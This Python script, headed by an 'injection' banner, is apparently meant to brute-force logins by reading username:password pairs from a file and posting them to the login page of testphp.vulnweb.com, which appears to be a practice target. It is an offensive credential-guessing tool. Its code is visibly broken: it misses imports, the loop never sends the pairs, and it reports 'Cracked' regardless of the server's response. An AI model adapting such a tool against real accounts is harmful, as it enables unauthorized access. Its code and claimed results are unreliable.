#!/usr/bin/python3

import time
from http import HTTPStatus
from urllib import request, parse
import json
print('''
  _       _           _   _  ___        
 (_)     (_)         | | (_)/ _ \       
  _ _ __  _  ___  ___| |_ _| | | |_ __  
 | | '_ \| |/ _ \/ __| __| | | | | '_ \ 
 | | | | | |  __/ (__| |_| | |_| | | | |
 |_|_| |_| |\___|\___|\__|_|\___/|_| |_|
        _/ |                            
       |__/                             
       '''
       # Testing simple http.post brute force with python

  )
class HTTPostman:
  username = 'admin'
  password = 'password'

  def __init__(u,p):
    self.username = u
    self.password = p

def check_internet():
    url='http://www.google.com/'
    timeout=2
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except:
        print("NO Connection")
    return False



def SendPayload():
  # Data dict
  data = { 'uname': 'test', 'pass': 'test' }
  data = json.dumps(data)
  data = str(data)
  data = data.encode('utf-8')
  filepath = 'sifre.txt'
  with open(filepath) as fp:
    line = fp.readline()
    out = []
    cnt = 1
    while line:
       split = line.split(":")
       username = split[0]
       password = split[1]
       username ="".join(username.split())
       password ="".join(password.split())
       print(username,password)
       time.sleep(1)
       line = fp.readline()
       cnt += 1
  payload = {'uname':username, 'pass':password}
  url = "http://testphp.vulnweb.com/userinfo.php"
  r = request.Request(url,data=data)
  resp = request.urlopen(r)
  print(resp)
  print("Trying =>", username , " : " , password)
  print("Cracked", payload)
  outz = open("cracked.txt", "w")
  outz.write(str(payload))
  outz.close()
  return resp


SendPayload()
